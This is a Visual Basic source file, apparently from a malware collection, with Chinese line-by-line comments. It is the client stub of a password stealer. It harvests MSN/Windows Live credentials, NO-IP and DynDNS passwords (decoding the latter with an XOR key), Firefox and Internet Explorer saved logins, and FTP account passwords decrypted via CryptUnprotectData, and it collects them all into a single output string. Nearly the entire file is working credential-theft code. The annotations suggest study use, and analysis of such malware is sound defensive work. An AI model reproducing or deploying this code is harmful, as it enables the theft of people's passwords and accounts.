'来源 https://github.com/maxamin/The-Awesome-And-Dangerous-collection/blob/ead488dbe9fe712c32fd7c40cf4287a9a75fbbd9/ActiveMalwares/VRT/Stub/Client/Module1.vb
'VB文件导入了多个命名空间，这些命名空间包含了一些常用的类、结构体和方法，可以帮助VB程序员编写功能更加强大和灵活的代码
'System：提供了基本的数据类型和系统级别的类和方法，如Object、String、DateTime等
Imports System
'System.IO ： 提供了文件和目录的相关类和方法， 如File、Directory、Path等
Imports System.IO
'System.Net：提供了网络相关的类和方法，如WebClient、WebRequest、WebResponse等
Imports System.Net
'System.Text：提供了一些字符串处理相关的类和方法，如StringBuilder、Encoding等
Imports System.Text
'System.Net.Sockets：提供了网络编程相关的类和方法，如Socket、TcpClient、UdpClient等
Imports System.Net.Sockets 'net
'System.Security.Cryptography：提供了加密和解密相关的类和方法，如DES、RSA等
Imports System.Security.Cryptography
'System.Runtime.InteropServices：提供了与非托管代码交互的相关类和方法，如DllImport、Marshal等
Imports System.Runtime.InteropServices
'System.Environment：提供了与操作系统环境相关的类和方法，如CommandLine、CurrentDirectory等
Imports System.Environment
'System.Windows：提供了与Windows窗体应用程序相关的类和方法，如Window、Forms、Controls等
Imports System.Windows
'System.Windows.Forms：提供了Windows窗体应用程序中常用的控件和方法，如Button、TextBox、MessageBox等
Imports System.Windows.Forms
'Microsoft.VisualBasic：提供了一些基本的Visual Basic语言功能和类库，如Conversion、Interaction等
Imports Microsoft.VisualBasic
'Microsoft.VisualBasic.CompilerServices：提供了一些运行时支持和代码生成相关的类和方法，如Operators、StandardModuleAttribute等
Imports Microsoft.VisualBasic.CompilerServices

'定义了一个名为“a”的公共类（Public Class a），其中包含了一个名为“GT”的公共静态函数（Public Shared Function GT），该函数返回一个字符串类型的值
'get passwords
Public Class a 'get password file manager
    '函数主要用于获取各种密码文件，并将这些密码以字符串的形式返回
    Public Shared Function GT() As String
        '在函数内部，首先定义了一个名为“OL”的字符串类型变量，并将其初始化为空字符串（OL = ""）
        OL = ""
        '调用了一系列子函数，包括“hotmail()”、“P2()”、“dyn()”、“mozila()”、“g.google()”和“GetOpera()”
        '这些子函数分别用于获取不同类型的密码文件
        hotmail()
        P2()
        dyn()
        mozila()
...
'定义了一个名为“h”的模块（Module），其中包含了一个名为“OL”的公共字符串类型变量（Public OL As String）
'模块是一种特殊的类，可以包含函数、子程序、变量和常量等，但不需要实例化即可使用其中的成员
'在这个模块中定义的“OL”变量可以在整个程序中被访问和使用
'“Public”关键字表示这个变量是公共的，可以被其他模块或类访问
'String”关键字表示这个变量的数据类型是字符串类型
Module h
    Public OL As String

    '**************************************************************************************************
    'Module Name: 获取MSN密码信息
    'Description: 该模块用于获取Windows Live Messenger（即MSN）的密码信息，并将其存储在“OL”字符串变量中。
    '包含两个声明函数和一个名为“CREDENTIAL”的结构体。
    '函数CredEnumerateW用于获取Windows凭据存储中的凭据。
    '结构体CREDENTIAL用于存储凭据的各种信息。
    'References: advapi32.dll
    'Created By: [Your Name]
    'Created Date: [Date]
    '**************************************************************************************************
#Region "hotmail Password"
    ''导入Windows API库中的CredEnumerateW函数，用于获取Windows凭据存储中的凭据
    '用于声明从Windows API中导入的函数或方法
    '这里导入了“advapi32.dll”库中的“CredEnumerateW”函数，该函数用于获取Windows凭据存储中的凭据
    <DllImport("advapi32.dll", CharSet:=CharSet.Unicode, SetLastError:=True)>
    '定义了一个名为“CredEnumerateW”的函数，该函数是从Windows API库中导入的
    '其参数包括：过滤器字符串、“flag”标志、“count”计数器和指向凭据的指针
    '函数返回一个布尔类型值
    ...
    End Function
    '定义一个名为CREDENTIAL的结构体，用于存储凭据的各种信息
    '该结构体包含了多个字段，
    '包括标志、类型、目标名称、注释、最后修改时间、凭据大小、凭据、持久性、属性计数、属性和目标别名
    <StructLayout(LayoutKind.Sequential)>
    Friend Structure CREDENTIAL
        Public Flags As Integer
        Public Type As Integer
        '用于指定字段的数据类型为Unicode字符串类型
    ...
    '定义了一个名为“hotmail”的子过程，用于获取MSN密码信息
    Sub hotmail()
        'OL += vbNewLine & "###MSN" & vbNewLine
        Try
            '定义了一个名为“num”的无符号32位整数类型变量
            Dim num As UInt32
            '定义了一个名为“zero”的指向空指针的指针变量
            Dim zero As IntPtr = IntPtr.Zero
            '调用“CredEnumerateW”函数，并将返回值与“True”进行比较
            '如果函数调用成功，则执行下一步操作
            If CredEnumerateW(("WindowsLive:name=" & "*"), 0, num, zero) Then
                '定义了一个名为“i”的32位整数类型变量
                Dim i As Integer
                '循环体，从0到“num-1”遍历凭据信息
                For i = 0 To num - 1
                    Try
                        Dim s As String
                        '将MSM的URL地址添加到“OL”字符串变量中
                        OL += "|URL| http://hotmail.com" & vbNewLine
                        '将指针“zero”指向的内存地址读入到“credential”结构体中，以获取凭据的详细信息
                        ...
                        '将MSN的用户名添加到“OL”字符串变量中
                        OL += "|USR| " & credential.UserName & vbNewLine
                        Try
                            '将MSN的密码添加到“OL”字符串变量中
...
#End Region
    ...
    '定义一个名为P2的子进程，并在注释中说明该子过程的用途为获取NO-IP的用户名和密码
    Sub P2() 'NO-IP
        '开启一个Try代码块，用于捕获可能发生的异常
        Try
            '该行代码被注释掉，原本的作用是将“###NO-IP”字符串添加到名为OL的字符串变量中，并在该字符串前后添加换行符
            'OL += vbNewLine & "###NO-IP" & vbNewLine
            '定义一个名为s的字符串变量，并将其初始化为"HKEY_LOCAL_MACHINE\SOFTWARE\Vitalwerks\DUC"
            '该字符串是用于访问Windows注册表中NO-IP的信息的键路径
            Dim s As String = "HKEY_LOCAL_MACHINE\SOFTWARE\Vitalwerks\DUC"
            '定义名为U和P的字符串变量，分别用于存储NO-IP的用户名和密码
            '调用Registry.GetValue方法从注册表中获取相应的键值，如果获取失败则将变量初始化为空字符串
            Dim U As String = Microsoft.Win32.Registry.GetValue(s, "USERname", "")
            Dim P As String = Microsoft.Win32.Registry.GetValue(s, "Password", "")
            '如果用户名为空字符串，则退出该子过程
            If U = "" Then Exit Sub
            '将NO-IP的URL、用户名和密码添加到名为OL的字符串变量中，其中使用了竖线(|)作为分隔符
            OL += "|URL| http://no-ip.com" & vbNewLine & "|USR| " & U & vbNewLine & "|PWD| " & P & vbNewLine
            '捕获可能发生的异常，并将异常信息存储在名为c的变量中
        Catch c As Exception
            '结束Try代码块
        End Try
        '结束P2子进程的定义
    End Sub
    '定义一个名为GetVolumeInformation的函数，用于从指定的磁盘卷标或硬盘卷标中获取相关信息
    ...
    '定义一个名为HWD的函数，用于获取计算机的硬件ID
    Function HWD() As String
        '开启一个Try代码块，用于捕获可能发生的异常
        Try
            '定义一个名为sn的整型变量，并调用GetVolumeInformation函数获取当前计算机的硬盘卷标信息，并将结果存储在sn变量中
            Dim sn As Integer
            'Environ("SystemDrive")返回当前操作系统的系统盘符，将其与反斜杠()连接形成磁盘卷标的完整路径
            GetVolumeInformation(Environ("SystemDrive") & "\", Nothing, Nothing, sn, 0, 0, Nothing, Nothing)
            '将获取到的硬盘卷标信息转换为16进制字符串，并将其作为函数的返回值
            Return (Hex(sn))
            '捕获可能发生的异常，并将异常信息存储在名为ex的变量中
        Catch ex As Exception
            '如果发生异常，则将字符串"ERR"作为函数的返回值
            Return "ERR"
            '结束Try代码块
        End Try
        '结束函数的定义
    ...
    '定义一个名为dyn的子过程
    Sub dyn()
        '在注释中说明该子过程的用途为获取DynDNS的用户名和密码
        'DynDNS.com
        '开启一个Try代码块，用于捕获可能发生的异常
        Try
            '该行代码被注释掉，原本的作用是将“###DynDNS”字符串添加到名为OL的字符串变量中，并在该字符串前后添加换行符
            'OL += vbNewLine & "###DynDNS" & vbNewLine

            '定义一个名为p的字符串变量，使用Replace函数将Environ("ALLUSERSPROFILE")返回的字符串中的双反斜杠（\）替换为单反斜杠（\），并将结果存储在p变量中
            Dim p = Replace(Environ("ALLUSERSPROFILE") & "\", "\\", "\")
            '定义一个名为pp的字符串变量，用于存储DynDNS的配置文件路径
            Dim pp = p & "DynDNS\Updater\config.dyndns"
            '定义四个变量，分别为usr、ps、pas和ii，均为字符串或整数类型
            Dim usr As String
            Dim ps As String
            Dim pas As String
            Dim ii As Integer
            '如果DynDNS的配置文件存在，则执行以下代码块
            If File.Exists(pp) = True Then
                '定义一个名为A的数组变量，使用File.ReadAllLines函数读取DynDNS的配置文件，并将每一行存储在数组A的一个元素中
                Dim A As Array = File.ReadAllLines(pp)
                '对数组A中的每一个元素执行以下代码块
                For Each s As String In A
                    '如果该行包含“username=”字符串，则将该行按等号（=）分隔，将等号后面的字符串存储在usr变量中
                    If InStr(s.ToLower, "username=") > 0 Then
                        usr = Split(s, "=")(1)
                    End If
                    '如果该行包含“password=”字符串，则将该行按等号（=）分隔，将等号后面的字符串存储在ps变量中
                    If InStr(s.ToLower, "password=") > 0 Then
                        ps = Split(s, "=")(1)
                        '使用For循环将ps变量中每两个字符转换为一个ASCII码
                        For i = 1 To Len(ps) Step 2
                            pas = pas & Chr(Val("&H" & Mid(ps, i, 2)))
                        Next i
                        '使用第二个For循环将pas变量中每个字符与“t6KzXhCh”字符串中对应位置的字符进行异或运算
                        For i = 1 To Len(pas)
                        ...
                        '最终将处理后的用户名和密码添加到名为OL的字符串变量中，并在各个字段之间插入分隔符
...
#Region "FireFox"
Module firefox
    Public Function mozila() As String
...
Friend Class CIE7Passwords
    ...
    End Structure
    '定义一个名为INTERNET_CACHE_ENTRY_INFO的结构体
    ...
    End Structure
    '声明一个名为FindFirstUrlCacheEntry的函数，其返回值为整型
    '该函数位于wininet.dll动态链接库中，别名为FindFirstUrlCacheEntryA
    '函数参数包括lpszUrlSearchPattern，lpFirstCacheEntryInfo以及lpdwFirstCacheEntryInfoBufferSize
    ...
    '声明一个名为FindNextUrlCacheEntry的函数，其返回值为整型
    '该函数位于wininet.dll动态链接库中，别名为FindNextUrlCacheEntryA
    '函数参数包括hEnum，lpFirstCacheEntryInfo以及lpdwFirstCacheEntryInfoBufferSize
    ...
    '声明一个名为CryptCreateHash的函数，其返回值为整型
    '该函数位于advapi32.dll动态链接库中
    '函数参数包括hProv，Algid，hKey，dwFlags，phHash
    ...
    '声明一个名为CryptHashData的函数，其返回值为整型
    '该函数位于advapi32.dll动态链接库中
    '函数参数包括hHash，pbData，dwDataLen，dwFlags
    ...
    '定义一个名为HP_HASHVAL的整型常量，其值为&H2S
    Private Const HP_HASHVAL As Integer = &H2S

    '声明一个名为CryptGetHashParam的函数，其返回值为整型
    '该函数位于advapi32.dll动态链接库中
    '函数参数包括hHash，dwParam，pByte，pdwDataLen，dwFlags
    '第三个参数pByte使用了MarshalAs特性，指定了参数类型为从非托管代码返回的字节数组
    ...
    '声明一个名为CryptSignHash的函数，其返回值为整型
    '该函数位于advapi32.dll动态链接库中，别名为CryptSignHashA
    '函数参数包括hHash，dwKeySpec，sDescription，dwFlags，pbSignature，pdwSigLen
    ...
    '声明一个名为CryptDestroyHash的函数，其返回值为整型
    '该函数位于advapi32.dll动态链接库中
    '函数参数为hHash
    ...
    '声明一个名为CryptReleaseContext的函数，其返回值为整型
    '该函数位于advapi32.dll动态链接库中
    '函数参数为hProv和dwFlags
    ...
    '声明一个名为RegOpenKeyEx的函数，其返回值为整型
    '该函数位于advapi32.dll动态链接库中，别名为RegOpenKeyExA
    '函数参数包括hKey，lpSubKey，ulOptions，samDesired，phkResult
    ...
    '声明一个名为RegQueryValueEx的函数，其返回值为整型
    '该函数位于advapi32.dll动态链接库中，别名为RegQueryValueExA
    '函数参数包括hKey，lpValueName，lpReserved，lpType，lpData，lpcbData
    ...
    '声明一个名为RegDeleteValue的函数，其返回值为整型
    '该函数位于advapi32.dll动态链接库中，别名为RegDeleteValueA
    '函数参数包括hKey和lpValueName
    ...
    '声明一个名为LocalFree的函数，其返回值为整型
    '该函数位于kernel32.dll动态链接库中
    '函数参数为hMem
    Private Declare Function LocalFree Lib "kernel32.dll" (ByVal hMem As Integer) As Integer

    '声明一个名为RegCloseKey的函数，其返回值为整型
    '该函数位于advapi32.dll动态链接库中
    '函数参数为hKey
    Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Integer) As Integer

    '定义一个名为DATA_BLOB的结构体
    '结构体包括cbData和pbData两个整型成员
    Private Structure DATA_BLOB
        Dim cbData As Integer
        Dim pbData As Integer
    End Structure

    '声明一个名为CryptUnprotectData的函数，其返回值为整型
    '该函数位于crypt32.dll动态链接库中
    '函数参数包括pDataIn，ppszDataDescr，pOptionalEntropy，pvReserved，pPromptStruct，dwFlags，pDataOut
    '其中pDataIn，pOptionalEntropy和pDataOut均为DATA_BLOB类型
    ...
    '重载一个名为CryptUnprotectData的函数，其返回值为整型
    '该函数位于crypt32.dll动态链接库中
    '函数参数包括pDataIn，ppszDataDescr，pOptionalEntropy，pvReserved，pPromptStruct，dwFlags，pDataOut
    '其中pDataIn和pDataOut均为DATA_BLOB类型，pOptionalEntropy为ByRef DATA_BLOB类型
    ...
    '定义一个名为StringIndexHeader的结构体
    '结构体包括dwWICK，dwStructSize，dwEntriesCount，dwUnkId，dwType和dwUnk六个整型成员
    ...
    '定义一个名为StringIndexEntry的结构体
    '结构体包括dwDataOffset，ftInsertDateTime和dwDataSize三个整型成员
    ...
    '定义一个名为CRED_TYPE的枚举类型
    '该枚举类型包括GENERIC、DOMAIN_PASSWORD、DOMAIN_CERTIFICATE、DOMAIN_VISIBLE_PASSWORD和MAXIMUM五个成员
    ...
    '定义一个名为CREDENTIAL_ATTRIBUTE的结构体
    '结构体包括lpstrKeyword、dwFlags、dwValueSize和lpbValue四个整型成员
    ...
    '定义一个名为CREDENTIAL的结构体
    '结构体包括dwFlags、dwType、lpstrTargetName、lpstrComment、ftLastWritten、dwCredentialBlobSize、lpbCredentialBlob、dwPersist、dwAttributeCount、lpAttributes、lpstrTargetAlias和lpUserName十一个整型成员
    ...
    '声明使用advapi32.dll中的CredEnumerate函数
    '该函数可用于列举凭据
    ...
    '声明使用advapi32.dll中的CredDelete函数
    '该函数可用于删除凭据
    ...
    '定义一个名为GetSHA1Hash的函数，返回值为字符串类型
    '函数参数为Byte类型的pbData数组
    '函数用于计算pbData数组的SHA1哈希值，并返回该哈希值的十六进制字符串表示
    Private Function GetSHA1Hash(ByRef pbData() As Byte) As String
        '声明一个名为 buff 的字节数组，用于存储计算出来的哈希值
        Dim buff() As Byte
        '声明一个名为 i 的整数变量，用作循环计数器
        Dim i As Integer
        '重新定义 pbData 数组的大小，添加一个额外的元素，以确保可以安全地计算哈希值而不会发生内存损坏问题
        ReDim Preserve pbData(pbData.Length + 1)
        '使用 System.Security.Cryptography 命名空间中的 SHA1.Create().ComputeHash 方法计算输入数据的 SHA-1 哈希值，并将结果存储在 buff 数组中
        buff = System.Security.Cryptography.SHA1.Create().ComputeHash(pbData)
        '初始化输出字符串为空字符串
        GetSHA1Hash = ""
        '进入一个循环，循环次数为 buff 数组的长度减一
        '将 buff 数组中的当前字节转换为一个两位十六进制字符串， 使用 Hex 函数， 如果需要则使用 Right 函数在前面添加一个零， 最后将其附加到输出字符串中
        For i = 0 To buff.Length - 1
            GetSHA1Hash = GetSHA1Hash & Right("00" & Hex(buff(i)), 2)
        Next
    End Function

    '定义一个私有子进程 ProcessIEPass，
    '它接受三个参数：一个字符串类型的 URL，一个字符串类型的哈希值，以及一个类型为 DATA_BLOB 的结构体类型的数据
    Private Sub ProcessIEPass(ByVal strURL As String, ByVal strHash As String, ByVal dataOut As DATA_BLOB)
        '定义一个名为 k 的整数变量，用作循环计数器
        Dim k As Integer 'index
        '定义名为 ptrData 和 ptrEntry 的指针类型变量，用于存储内存中的地址
        Dim ptrData, ptrEntry As IntPtr
        '定义一个名为 hIndex 的 StringIndexHeader 类型的变量，用于存储字符串索引数据的头部信息
        Dim hIndex As StringIndexHeader
        '定义名为 cbhIndex 和 cbentry 的整数变量，分别用于存储头部信息和条目信息的长度
        Dim cbhIndex, cbentry As Integer
        '定义一个名为 eIndex 的 StringIndexEntry 类型的变量，用于存储字符串索引数据的条目信息
        Dim eIndex As StringIndexEntry
        '定义名为 strUserName 和 strPasswd 的字符串类型变量， 用于存储从内存中提取的用户名和密码信息
        Dim strUserName, strPasswd As String
        '定义一个名为 ptr 的指针类型变量，用于存储内存中的地址
        Dim ptr As IntPtr
        '计算条目信息的长度，并将其赋值给 cbentry 变量
        cbentry = Len(eIndex)
        '计算头部信息的长度，并将其赋值给 cbhIndex 变量
        cbhIndex = Len(hIndex)
        '获取数据结构中的 pbData 字节数组的地址，并将其加上一个字节的偏移量，然后将其转换为 IntPtr 类型，并将其赋值给 ptr 变量
        ptr = New IntPtr(dataOut.pbData + Marshal.ReadByte(New IntPtr(dataOut.pbData)))
        '将内存中的数据结构（StringIndexHeader）的内容复制到 hIndex 变量中
        hIndex = CType(Marshal.PtrToStructure(ptr, hIndex.GetType()), StringIndexHeader)
        '如果头部信息中的 dwType 字段为 1，则表示保存的是密码信息
        If hIndex.dwType = 1 Then 'passwd
            '如果头部信息中的 dwEntriesCount 字段大于等于 2，则表示保存了至少一个账户和密码信息
            If hIndex.dwEntriesCount >= 2 Then
                '获取条目信息的地址，并将其赋值给 ptrEntry 变量
                ptrEntry = New IntPtr(ptr.ToInt32 + hIndex.dwStructSize)
                '获取数据信息的地址，并将其赋值给 ptrData 变量
                ptrData = New IntPtr(ptrEntry.ToInt32() + hIndex.dwEntriesCount * cbentry)
                '循环遍历所有的条目信息，每次遍历两个条目
                For i As Integer = 0 To hIndex.dwEntriesCount - 1 Step 2
                    '如果指针为空，则退出循环
                    If ptrData = IntPtr.Zero Or ptrEntry = IntPtr.Zero Then Exit Sub
                    '将内存中的数据结构（StringIndexEntry）的内容复制到 eIndex 变量中
                    ...
                    End If
                    '将ptrEntry指向的下一个条目信息的地址赋值给ptrEntry变量
                    ptrEntry = New IntPtr(ptrEntry.ToInt32 + cbentry)
                    '将当前账户和密码信息添加到OL变量中
                ...
                Next
            End If
            '如果hIndex.dwType = 0，则表示当前处理的是用户名信息
        ElseIf hIndex.dwType = 0 Then  'champ
            '将strPasswd变量设置为空字符串
            strPasswd = vbNullString
            '获取条目信息的地址，并将其赋值给ptrEntry变量
            ptrEntry = New IntPtr(ptr.ToInt32 + hIndex.dwStructSize)
            '获取数据信息的地址，并将其赋值给ptrData变量
            ptrData = New IntPtr(ptrEntry.ToInt32() + hIndex.dwEntriesCount * cbentry)
            '如果指针为空，则退出循环
            If ptrData = IntPtr.Zero Or ptrEntry = IntPtr.Zero Then Exit Sub
            '循环遍历所有的条目信息
            For k = 0 To hIndex.dwEntriesCount - 1
                '将内存中的数据结构（StringIndexEntry）的内容复制到eIndex变量中
                eIndex = CType(Marshal.PtrToStructure(ptrEntry, eIndex.GetType()), StringIndexEntry)
                '将当前条目的用户名信息大小分配给strUserName变量，并将其填充为空格
                strUserName = Space(eIndex.dwDataSize)
                '如果当前用户名信息是Unicode编码，则将其转换为字符串类型；如果当前用户名信息是ANSI编码，则将其转换为字符串类型
                If lstrlenA(New IntPtr(ptrData.ToInt32() + eIndex.dwDataOffset)) <> eIndex.dwDataSize Then 'UNICODE
                    strUserName = Marshal.PtrToStringUni(New IntPtr(ptrData.ToInt32() + eIndex.dwDataOffset))
                Else 'ANSI
                    strUserName = Marshal.PtrToStringAnsi(New IntPtr(ptrData.ToInt32() + eIndex.dwDataOffset))
    ...
    Private Sub AddPasswdInfo(ByVal strRess As String, ByVal hKey As Integer)
        ...
        If cbData > 0 Then
            ...
            '调用CryptUnprotectData函数，解密加密的密码信息
            Call CryptUnprotectData(dataIn, 0, Entropy, 0, 0, 0, dataOut)
            '将解密后的密码信息作为参数传递给ProcessIEPass函数
    ...
    '定义了一个函数（CopyString），它有一个参数ptr（指向内存中字符串的指针），并返回一个Unicode编码的字符串
    ...
    Public Sub Refresh()
        Try
            ...
            '主要用于获取当前用户在Windows操作系统中存储的FTP账户信息并将其解密，以便在命令行或其他程序中使用。
            '这行代码打开了Windows注册表中与FTP账户相关的子键，以便读取存储的FTP账户信息
            ...
            '遍历 ftpAccounts 对象下的所有子键名，将键名存储在变量 account 中
            For Each account As String In ftpAccounts.GetSubKeyNames()
                '打开名为 account 的子键，并将其存储在 accountKey 变量中
                Dim accountKey As Microsoft.Win32.RegistryKey = ftpAccounts.OpenSubKey(account)
                '遍历 accountKey 对象下的所有子键名，将键名存储在变量 user 中
                For Each user As String In accountKey.GetSubKeyNames()
                    '打开名为 user 的子键，并将其存储在 userKey 变量中
                    Dim userKey As Microsoft.Win32.RegistryKey = accountKey.OpenSubKey(user)
                    '从 userKey 子键中获取名为 "Password" 的键值，并将其转换为字节数组，存储在 pass 变量中
                    Dim pass() As Byte = CType(userKey.GetValue("Password"), Byte())
                    '定义一个长度为 4 的字节数组 dwEntropy，用于存储加密数据的熵
                    Dim dwEntropy(3) As Byte
                    '循环遍历 account 变量中的每个字符
                    For j As Integer = 0 To account.Length - 1
                        '获取 account 变量中第 j 个字符的 ASCII 码值，并将其与 0x1F 进行按位与操作，获取一个字节的值并存储在 c 变量中
                        Dim c As Byte = CByte(AscW(account(j)) And &H1F)
                        '将 c 变量的值加到 dwEntropy 数组的对应位置上
                        dwEntropy(j And 3) = dwEntropy(j And 3) + c
                    Next
                    '设置一个 CRYPTPROTECTDATA 结构体，用于存储要加密的数据的长度
                    dataIn.cbData = pass.Length
                    '分配一块内存，用于存储要加密的数据，并将其指针存储在 dataIn.pbData 变量中
                    dataIn.pbData = Marshal.AllocHGlobal(pass.Length).ToInt32()
                    '将 pass 数组中的数据复制到 dataIn.pbData 指向的内存中
                    Marshal.Copy(pass, 0, New IntPtr(dataIn.pbData), pass.Length)
                    '设置一个 CRYPTPROTECTDATA 结构体，用于存储解密后的数据的长度
                    dataOut.cbData = 0
                    '设置一个指针，用于存储解密后的数据
                    dataOut.pbData = 0
                    '将 dwEntropy 数组固定在内存中，并将其句柄存储在 gc 变量中
                    Dim gc As GCHandle = GCHandle.Alloc(dwEntropy, GCHandleType.Pinned)
                    '设置一个 CRYPTPROTECTDATA 结构体，用于存储加密数据的熵，并将其指向 dwEntropy 数组的指针存储在 Entropy.pbData 变量中
                    Entropy.pbData = gc.AddrOfPinnedObject().ToInt32()
                    '设置加密数据的熵的长度
                    Entropy.cbData = 4
                    '使用 Windows API 函数 CryptUnprotectData 对 dataIn 中的数据进行解密，并将解密后的数据存储在 dataOut 中
                    CryptUnprotectData(dataIn, 0, Entropy, 0, 0, 0, dataOut)
                    '释放 dwEntropy 数组在内存中的固定
                    gc.Free()
                    '将 FTP 账户名、用户名和密码以特定格式拼接到字符串变量 OL 中
